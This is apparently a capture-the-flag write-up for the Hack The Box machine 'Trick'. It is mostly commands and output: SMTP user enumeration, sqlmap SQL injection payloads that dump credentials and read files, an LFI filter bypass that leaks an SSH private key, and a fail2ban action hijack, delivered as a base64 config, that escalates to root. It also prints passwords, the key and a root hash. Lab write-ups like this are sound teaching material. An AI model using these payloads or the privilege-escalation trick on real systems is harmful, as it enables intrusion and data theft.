> Author: **[Geiseric][author-profile]**

## Discovery

### Services

```shell
# Nmap 7.92 scan initiated Sun Jul 10 22:11:08 2022 as: nmap -Pn -v -A -oN discovery/10.10.11.166/services.tcp.1000.nmap 10.10.11.166
Nmap scan report for trick.htb (10.10.11.166)
Host is up (0.052s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
| http-methods:
|_  Supported Methods: GET HEAD
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Vhosts

```shell
dig ANY @10.10.11.166 trick.htb
# ANSWER SECTION:
# trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
# trick.htb.              604800  IN      NS      trick.htb.
# trick.htb.              604800  IN      A       127.0.0.1
# trick.htb.              604800  IN      AAAA    ::1
dig trick.htb @10.10.11.166 AXFR
# trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
# trick.htb.              604800  IN      NS      trick.htb.
# trick.htb.              604800  IN      A       127.0.0.1
# trick.htb.              604800  IN      AAAA    ::1
# preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
# trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
```

### Users

SMTP can leak users:

```shell
nc trick.htb 25
# 220 debian.localdomain ESMTP Postfix (Debian/GNU)
EHLO all
# 250-debian.localdomain
# 250-PIPELINING
# 250-SIZE 10240000
# 250-VRFY
# 250-ETRN
# 250-STARTTLS
# 250-ENHANCEDSTATUSCODES
# 250-8BITMIME
# 250-DSN
# 250-SMTPUTF8
# 250 CHUNKING
VRFY admin
# 550 5.1.1 <admin>: Recipient address rejected: User unknown in local recipient table
VRFY root
# 252 2.0.0 root
VRFY mysql
# 252 2.0.0 mysql
```

### Web browsing

The frontpage is a static "coming soon" disclaimer. Even the contact form looks disabled:

![][disabled-form]

Even with a token, this contact form would actually reach `startbootstrap.com`:
surely the path does not include comprimising a large CDN.

The page for `root.trick.htb` is exactly the same!
Saving and comparing the HTML confirms it, there is no significant difference.

But `preprod-payroll.trick.htb` lands on a login page:

![][preprod-subdomain]

## Admin on the web dashboard

The login page is vulnerable to SQL injection:

```shell
sqlmap -r requests/login.txt --dbms=mysql --level=5 --risk=3
# ---
# Parameter: username (POST)
#     Type: boolean-based blind
#     Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
#     Payload: username=a' OR NOT 4280=4280-- ZTTs&password=b

#     Type: error-based
#     Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
#     Payload: username=a' OR (SELECT 9262 FROM(SELECT COUNT(*),CONCAT(0x716a6a6271,(SELECT (ELT(9262=9262,1))),0x716a787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- erwm&password=b

#     Type: time-based blind
#     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
#     Payload: username=a' AND (SELECT 4279 FROM (SELECT(SLEEP(5)))JLJA)-- Mgdt&password=b
# ---
sqlmap -r requests/login.txt --dbms mysql -p username --level=5 --risk=3 --schema
# Database: payroll_db
# Table: users
# [8 columns]
# +-----------+--------------+
# | Column    | Type         |
# +-----------+--------------+
# | address   | text         |
# | contact   | text         |
# | doctor_id | int(30)      |
# | id        | int(30)      |
# | name      | varchar(200) |
# | password  | varchar(200) |
# | type      | tinyint(1)   |
# | username  | varchar(100) |
# +-----------+--------------+
sqlmap -r requests/login.txt --dbms mysql -p username --level=5 --risk=3 --dump -D payroll_db -T users
# +----+-----------+---------------+------+---------+---------+-----------------------+------------+
# | id | doctor_id | name          | type | address | contact | password              | username   |
# +----+-----------+---------------+------+---------+---------+-----------------------+------------+
# | 1  | 0         | Administrator | 1    | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
# +----+-----------+---------------+------+---------+---------+-----------------------+------------+
```

These credentials give access to the web UI.

## User

### Getting information

```shell
sqlmap -r requests/login.txt --dbms mysql -p username --level=5 --risk=3 --file-read /etc/passwd
grep -v nologin _etc_passwd
# root:x:0:0:root:/root:/bin/bash
# sync:x:4:65534:sync:/bin:/bin/sync
# tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
# speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
# hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
# Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
# mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
# michael:x:1001:1001::/home/michael:/bin/bash
sqlmap -r requests/login.txt --dbms mysql -p username --level=5 --risk=3 --file-read /home/michael/.ssh/id_rsa
```

But the last command fails for lack of privileges.

The logout button points toward `http://preprod-payroll.trick.htb/ajax.php?action=save_settings`.
Fuzzing the action resulted in an interesting error:

```
Notice: Undefined variable: name in /var/www/payroll/admin_class.php on line 102
Notice: Undefined variable: email in /var/www/payroll/admin_class.php on line 103
Notice: Undefined variable: contact in /var/www/payroll/admin_class.php on line 104
Notice: Undefined variable: about in /var/www/payroll/admin_class.php on line 105
Notice: Undefined index: img in /var/www/payroll/admin_class.php on line 106
Notice: Trying to get property 'num_rows' of non-object in /var/www/payroll/admin_class.php on line 115
```

> the website content is in `/var/www/payroll/`

### Random facts

On the web dashboard, each navigation item corresponds to a PHP file:

```html
<a href="index.php?page=attendance" class="nav-item nav-attendance"><span class="icon-field"></span> Attendance</a>
<script>
	$('.nav-users').addClass('active')
</script>
```

In the anchor's URL, the extension is not present: most likely the parent script adds it with a statement like:

```php
include $target.".php"
```

It would explain why `http://preprod-payroll.trick.htb/index.php?page=/etc/passwd` fails.

This could either be used to execute a would-be reverse shell or their may-be a way to bypass the `.php` suffix.
But I could not make it work fast and the SQL injection works well, so there was no need.

### Leaking the sources

```shell
sqlmap -r requests/login.txt --dbms mysql -p username --level=5 --risk=3 --file-read /var/www/payroll/admin_class.php
```

Most of the file is interactions with the DB, but a few pieces stand out:

```shell
grep -ai include sources/payroll/admin_class.php
# include 'db_connect.php';
grep -ia file sources/payroll/admin_class.php
# if($_FILES['img']['tmp_name'] != ''){
# $fname = strtotime(date('y-m-d H:i')).'_'.$_FILES['img']['name'];
# $move = move_uploaded_file($_FILES['img']['tmp_name'],'assets/img/'. $fname);
```

And `db_connect` contains:

```php
$conn= new mysqli('localhost','remo','TrulyImpossiblePasswordLmao123','payroll_db')or die("Could not connect to mysql".mysqli_error($con));
```

### Another subdomain!

While browsing around I like to have some form of recon, dixit [IppSec][ippsec] :D

The former LFI can be used to scan for subdomains:

```shell
perl -pe 's#^(.*)#preprod-$1#g' /usr/share/wordlists/discovery/raft-medium-directories.txt > discovery/wordlist.txt
cat /usr/share/wordlists/discovery/raft-medium-directories.txt >> discovery/wordlist.txt
ffuf -u 'http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=../FUZZ/index' -w  discovery/wordlist.txt -fw 1274
```

> `/var/www/market/index.php`

And it contains:

```shell
echo -n PD9waHANCiRmaWxlID0gJF9HRVRbJ3BhZ2UnXTsNCg0KaWYoIWlzc2V0KCRmaWxlKSB8fCAoJGZpbGU9PSJpbmRleC5waHAiKSkgew0KICAgaW5jbHVkZSgiL3Zhci93d3cvbWFya2V0L2hvbWUuaHRtbCIpOw0KfQ0KZWxzZXsNCglpbmNsdWRlKCIvdmFyL3d3dy9tYXJrZXQvIi5zdHJfcmVwbGFjZSgiLi4vIiwiIiwkZmlsZSkpOw0KfQ0KPz4= | base64 -d
# <?php
# $file = $_GET['page'];

# if(!isset($file) || ($file=="index.php")) {
#    include("/var/www/market/home.html");
# }
# else{
#         include("/var/www/market/".str_replace("../","",$file));
# }
# ?>
```

This time we have LFI without being limited to PHP files! IE:

```shell
curl $'http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa'
# -----BEGIN OPENSSH PRIVATE KEY-----
# b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
# NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
# c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
# YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
# 4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
# Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
# 1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
# DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
# +93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
# hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
# jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
# IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
# aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
# KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
# tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
# U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
# fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
# PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
# 3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
# fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
# AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
# In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
# JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
# jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
# IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
# -----END OPENSSH PRIVATE KEY-----
```

## Root

```shell
sudo -l
# User michael may run the following commands on trick:
#     (root) NOPASSWD: /etc/init.d/fail2ban restart
ls -lah /etc/fail2ban/
# drwxrwx---   2 root security 4.0K Jul 11 22:12 action.d
# -rw-r--r--   1 root root     2.3K Jul 11 22:12 fail2ban.conf
# drwxr-xr-x   2 root root     4.0K Jul 11 22:12 fail2ban.d
# drwxr-xr-x   3 root root     4.0K Jul 11 22:12 filter.d
# -rw-r--r--   1 root root      23K Jul 11 22:12 jail.conf
# drwxr-xr-x   2 root root     4.0K Jul 11 22:12 jail.d
# -rw-r--r--   1 root root      645 Jul 11 22:12 paths-arch.conf
# -rw-r--r--   1 root root     2.8K Jul 11 22:12 paths-common.conf
# -rw-r--r--   1 root root      573 Jul 11 22:12 paths-debian.conf
# -rw-r--r--   1 root root      738 Jul 11 22:12 paths-opensuse.conf
groups
# michael security
```

Since "michael" has write access to `action.d`, the idea is to create a malicious action for a registered service. Then it will trigger upon being banned.

The default action is:

```shell
grep -ai banaction /etc/fail2ban/jail.conf
# banaction = iptables-multiport
# banaction_allports = iptables-allports
ls -lah /etc/fail2ban/action.d/
# -rw-r--r-- 1 root root     1.4K Jul 11 22:45 iptables-multiport.conf
```

Let's hijack this action:

```shell
mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak
```

Then recreate the files with the action set to:

```
actionban = cp /root/root.txt /tmp/flag && chown michael:michael /tmp/flag && chmod 777 /tmp/flag
```

The server was reset too quickly for me so I scripted it:

```shell
mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak &&
echo -n IyBGYWlsMkJhbiBjb25maWd1cmF0aW9uIGZpbGUKIwojIEF1dGhvcjogQ3lyaWwgSmFxdWllcgojIE1vZGlmaWVkIGJ5IFlhcm9zbGF2IEhhbGNoZW5rbyBmb3IgbXVsdGlwb3J0IGJhbm5pbmcKIwoKW0lOQ0xVREVTXQoKYmVmb3JlID0gaXB0YWJsZXMtY29tbW9uLmNvbmYKCltEZWZpbml0aW9uXQoKIyBPcHRpb246ICBhY3Rpb25zdGFydAojIE5vdGVzLjogIGNvbW1hbmQgZXhlY3V0ZWQgb25jZSBhdCB0aGUgc3RhcnQgb2YgRmFpbDJCYW4uCiMgVmFsdWVzOiAgQ01ECiMKYWN0aW9uc3RhcnQgPSA8aXB0YWJsZXM+IC1OIGYyYi08bmFtZT4KICAgICAgICAgICAgICA8aXB0YWJsZXM+IC1BIGYyYi08bmFtZT4gLWogPHJldHVybnR5cGU+CiAgICAgICAgICAgICAgPGlwdGFibGVzPiAtSSA8Y2hhaW4+IC1wIDxwcm90b2NvbD4gLW0gbXVsdGlwb3J0IC0tZHBvcnRzIDxwb3J0PiAtaiBmMmItPG5hbWU+CgojIE9wdGlvbjogIGFjdGlvbnN0b3AKIyBOb3Rlcy46ICBjb21tYW5kIGV4ZWN1dGVkIG9uY2UgYXQgdGhlIGVuZCBvZiBGYWlsMkJhbgojIFZhbHVlczogIENNRAojCmFjdGlvbnN0b3AgPSA8aXB0YWJsZXM+IC1EIDxjaGFpbj4gLXAgPHByb3RvY29sPiAtbSBtdWx0aXBvcnQgLS1kcG9ydHMgPHBvcnQ+IC1qIGYyYi08bmFtZT4KICAgICAgICAgICAgIDxhY3Rpb25mbHVzaD4KICAgICAgICAgICAgIDxpcHRhYmxlcz4gLVggZjJiLTxuYW1lPgoKIyBPcHRpb246ICBhY3Rpb25jaGVjawojIE5vdGVzLjogIGNvbW1hbmQgZXhlY3V0ZWQgb25jZSBiZWZvcmUgZWFjaCBhY3Rpb25iYW4gY29tbWFuZAojIFZhbHVlczogIENNRAojCmFjdGlvbmNoZWNrID0gPGlwdGFibGVzPiAtbiAtTCA8Y2hhaW4+IHwgZ3JlcCAtcSAnZjJiLTxuYW1lPlsgXHRdJwoKIyBPcHRpb246ICBhY3Rpb25iYW4KIyBOb3Rlcy46ICBjb21tYW5kIGV4ZWN1dGVkIHdoZW4gYmFubmluZyBhbiBJUC4gVGFrZSBjYXJlIHRoYXQgdGhlCiMgICAgICAgICAgY29tbWFuZCBpcyBleGVjdXRlZCB3aXRoIEZhaWwyQmFuIHVzZXIgcmlnaHRzLgojIFRhZ3M6ICAgIFNlZSBqYWlsLmNvbmYoNSkgbWFuIHBhZ2UKIyBWYWx1ZXM6ICBDTUQKIwphY3Rpb25iYW4gPSBjcCAvcm9vdC9yb290LnR4dCAvdG1wL2ZsYWcgJiYgY2htb2QgNzc3IC90bXAvZmxhZwoKIyBPcHRpb246ICBhY3Rpb251bmJhbgojIE5vdGVzLjogIGNvbW1hbmQgZXhlY3V0ZWQgd2hlbiB1bmJhbm5pbmcgYW4gSVAuIFRha2UgY2FyZSB0aGF0IHRoZQojICAgICAgICAgIGNvbW1hbmQgaXMgZXhlY3V0ZWQgd2l0aCBGYWlsMkJhbiB1c2VyIHJpZ2h0cy4KIyBUYWdzOiAgICBTZWUgamFpbC5jb25mKDUpIG1hbiBwYWdlCiMgVmFsdWVzOiAgQ01ECiMKYWN0aW9udW5iYW4gPSA8aXB0YWJsZXM+IC1EIGYyYi08bmFtZT4gLXMgPGlwPiAtaiA8YmxvY2t0eXBlPgoKW0luaXRdCg== | base64 -d > /etc/fail2ban/action.d/iptables-multiport.conf &&
sudo /etc/init.d/fail2ban restart
```

Spamming login requests will make the flag pop in `/tmp`!

> `root:$6$lbBzS2rUUVRa6Erd$u2u317eVZBZgdCrT2HViYv.69vxazyKjAuVETHTpTpD42H0RDPQIbsCHwPdKqBQphI/FOmpEt3lgD9QBsu6nU1:19104:0:99999:7:::`

[author-profile]: https://app.hackthebox.com/users/184611
[disabled-form]: images/disabled-form.png
[fail2ban-abuse]: https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7
[ippsec]: https://www.youtube.com/c/ippsec
[preprod-subdomain]: images/preprod-subdomain.pngsqlmap
